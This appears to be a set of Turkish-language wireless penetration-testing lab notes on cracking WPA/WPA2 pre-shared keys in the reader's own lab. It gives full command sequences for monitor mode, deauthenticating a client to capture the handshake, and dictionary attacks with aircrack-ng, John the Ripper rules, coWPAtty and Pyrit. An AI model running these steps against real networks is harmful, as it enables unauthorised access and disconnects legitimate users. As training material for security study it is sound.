### 11. Cracking WPA/WPA2 PSK with Aircrack-ng ###

11.1.1 Attack Setup Lab 

Laboratuvar erişim noktanızı WPA veya WPA2 şifrelemeyle yapılandırın ve önceden paylaşılan bir parola ayarlayın. Kurban istemcinizi ağa bağlanacak şekilde 
yeniden yapılandırdığınızdan emin olun.

- Kablosuz arayüzünüzü AP kanalında monitör modunda başlatın.
- Yakalamayı diske kaydederek bir Airodump yakalaması başlatın.

# airmon-ng start wlan0 3 
# airodump-ng -c 3 --bssid 34:08:04:09:3D:38 -w wpa1 mon0 

-----------

11.2.2 Deauthentication Attack Lab 

AP'nizin WPA şifrelemesiyle yapılandırıldığından ve onunla ilişkilendirilmiş bir kurban istemcisi olduğundan emin olun. Airodump-ng AP'nizin trafiğini yakalayıp 
kaydederek, kurban istemcinize karşı bir kimlik doğrulama saldırısı çalıştırın ve WPA 4 yönlü el sıkışmasını yeniden bağlanırken yakalayın.

# airmon-ng start wlan0 3 
# airodump-ng -c 3 --bssid 34:08:04:09:3D:38 -w wpa1 mon0 
# aireplay-ng -0 1 -a 34:08:04:09:3D:38 -c 00:18:4D:1D:A8:1F mon0 

------------

11.3.2 Aircrack-ng and WPA Lab 

WPA şifreniz, kullanmayı düşündüğünüz kelime listesinde zaten mevcut değilse, eklediğinizden emin olun.
Daha önce yakalanan WPA el sıkışmasını kullanarak, Aircrackng kullanarak WPA anahtarını kırmayı deneyin.

# airmon-ng start wlan0 3 
# airodump-ng -c 3 --bssid 34:08:04:09:3D:38 -w wpa1 mon0 
# aireplay-ng -0 1 -a 34:08:04:09:3D:38 -c 00:18:4D:1D:A8:1F mon0 
# aircrack-ng -w pass.txt wpa1-01.cap

---------

11.4.3 Airolib-ng Lab 

Airolib-ng'yi kullanarak, laboratuvar ESSID'nizi içeren bir veritabanı oluşturun ve AP parolanızı içeren bir parola listesini içe aktarın. PMK kombinasyonlarını 
işleyin ve daha önce yakaladığınız WPA el sıkışmasını kırmak için Airolib veritabanıyla birlikte Aircrack-ng'yi kullanın.

# echo mywifu > essid.txt 
# airolib-ng mywifu --import essid essid.txt 
# airolib-ng mywifu --import passwd /pentest/passwords/john/password.lst
# airolib-ng mywifu --batch
# aircrack-ng -r mywifu wap.cap 


----------------------------------------------------------------------------------------------------------------------------------------------------------------

### 12. Cracking WPA with JTR and Aircrack-ng ###

12.1.1 Attack Setup Lab 

Erişim noktanızı WPA / WPA2 şifrelemeyle yapılandırın ve parolanın sonuna 2 veya 3 basamak ekleyin. Kurban istemcinizi AP'ye bağlanacak şekilde yeniden 
yapılandırın.

- Kablosuz kartınızı izleme moduna getirin ve Airodump yakalamayı başlatın.
- Kurban istemcinin kimlik doğrulamasını kaldırın ve WPA 4 yönlü el sıkışmasını yakaladığınızdan emin olun.

# airmon-ng start wlan0 3
# airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>
# aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>

--------

12.2.1 Word Mangling Lab 

John.conf dosyasını WPA parolanızın bulunmasını sağlayacak bir kural eklemek için düzenleyin.

# cd /pentest/passwords/john/ 
# nano john.conf 

List.Rules.Wordlist bölümünün sonuna aşağıdaki 2 kuralı ekleyeceğiz:

$[0-9]$[0-9] 
$[0-9]$[0-9]$[0-9] 

John the Ripper'ı çalıştırıp parolamızı arayarak yeni kuralların etkinliğini test edebiliriz:

# ./john --wordlist=/pentest/wireless/aircrack-ng/test/password.lst --rules --stdout | grep -i Password123

----------

12.4 John the Ripper Lab 

Henüz yapmadıysanız, AP'nizin WPA / WPA2 şifreleme ile yapılandırıldığından emin olun. Bu modülde gösterildiği gibi fazladan rakamların eklenmesini gerektiren
bir şifre seçin.

- Kurban istemcinizin kimlik doğrulamasını kaldırarak bir WPA el sıkışması yakalayın.
- Yeni parolanızın bulunabilmesi için varsayılan John the Ripper kurallarını düzenleyin.
- John the Ripper'ı Aircrack-ng ile birlikte kullanarak WPA şifresini kırın.

# airmon-ng start wlan0 3
# airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>
# aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
# cd /pentest/passwords/john/ 
# nano john.conf 
# ./john -- wordlist=/pentest/wireless/aircrack-ng/test/password.lst --rules --stdout | aircrack-ng -e wifu -w - /root/wpajohn-01.cap 


------------------------------------------------------------------------------------------------------------------------------------------------------------------

#### 13. Cracking WPA with coWPAtty ###

13.1.1 Attack Setup Lab 

AP'nizi WPA / WPA2 şifrelemeyle yapılandırın ve kurban istemcinizi AP'ye bağlayın.

- Kablosuz kartınızı monitör moduna getirin ve bir Airodump yakalamaya başlayın.
- 4 yönlü anlaşmayı gerçekleştirmeye zorlamak için bağlı istemcinin kimlik doğrulamasını kaldırın.
- WPA şifrenizi kelime listenizin sonuna ekleyin.

# airmon-ng start wlan0 3
# airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>
# aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
# echo Password123 >> /pentest/passwords/john/password.lst 

------

13.4 coWPAtty Lab 

Henüz yapmadıysanız, AP'nizden 4 yönlü bir WPA el sıkışması yakalayın ve WPA şifresini kelime listenize ekleyin.

- WPA anahtarını almak için coWPAtty'yi yakalama dosyanıza karşı kelime listesi modunda çalıştırın.
- AP'niz için bir dizi karma oluşturun ve elde edilen dosyayı görmek için coWPAtty ile kullanın gökkuşağı tablolarını kullanırken hızdaki fark.

# airmon-ng start wlan0 3
# airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>
# aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
# echo Password123 >> /pentest/passwords/john/password.lst 

# cowpatty -r wpajohn-01.cap -f /pentest/passwords/john/password.lst -2 -s wifu

# genpmk -f /pentest/passwords/john/password.lst -d wifuhashes -s wifu
# cowpatty -r wpajohn-01.cap -d wifuhashes -2 -s wifu 

-----------------------------------------------------------------------------------------------------------------------------------------------------------------

### 14. Cracking WPA with Pyrit ###

14.1.1 Attack Setup Lab 

Erişim noktanızı WPA / WPA2 şifrelemeyle yapılandırın ve kurban istemcinizin AP ile ilişkilendirildiğinden emin olun. Kablosuz kartınızı AP kanal numarasında 
monitör moduna yerleştirmeyi unutmayın.

- Monitör modu arayüzünüzde koklamaya başlamak için Pyrit'i kullanın.
- Aireplay-ng ile kurban müşterinizin kimlik doğrulamasını kaldırın.
- Kimlik doğrulamasını kaldırma saldırısını başlattıktan sonra, el sıkışmayı algılayıp algılamadığını görmek için Pyrit çıktısını izleyin.

# airmon-ng start wlan0 3
# pyrit -r mon0 -o wpapyrit.cap stripLive
# aireplay-ng -0 1 -a 34:08:04:09:3D:38 -c 00:18:4D:1D:A8:1F mon0 


--------

14.4 Pyrit Lab 

AP'nizi WPA şifrelemeyle yapılandırın ve kurban istemcinizin kablosuz ağ ile ilişkilendirildiğinden emin olun. Kablosuz arayüzünüzü AP'nizin kanalında monitör 
modunda başlatmayı unutmayın.

- Monitör modu arayüzünüzde koklamak için Pyrit kullanın.
- Kurban müşterinizin kimlik doğrulamasını kaldırmak için Aireplay-ng kullanın.
- WPA parolasını kurtarmak için Pyrit'i kelime listesi modunda çalıştırın.
- Bir Pyrit veritabanı oluşturun ve parolanızı kırmak için veritabanı modunda kullanın.

# airmon-ng start wlan0 3
# pyrit -r mon0 -o wpapyrit.cap stripLive
# aireplay-ng -0 1 -a 34:08:04:09:3D:38 -c 00:18:4D:1D:A8:1F mon0 

# pyrit -r wpapyrit.cap -i /pentest/passwords/john/password.lst -b 34:08:04:09:3D:38 attack_passthrough

# pyrit eval
# pyrit -i /pentest/passwords/john/password.lst import_passwords 
# pyrit -e wifu create_essid
# pyrit batch
# pyrit -r wpapyrit.cap -b 34:08:04:09:3D:38 attack_db 

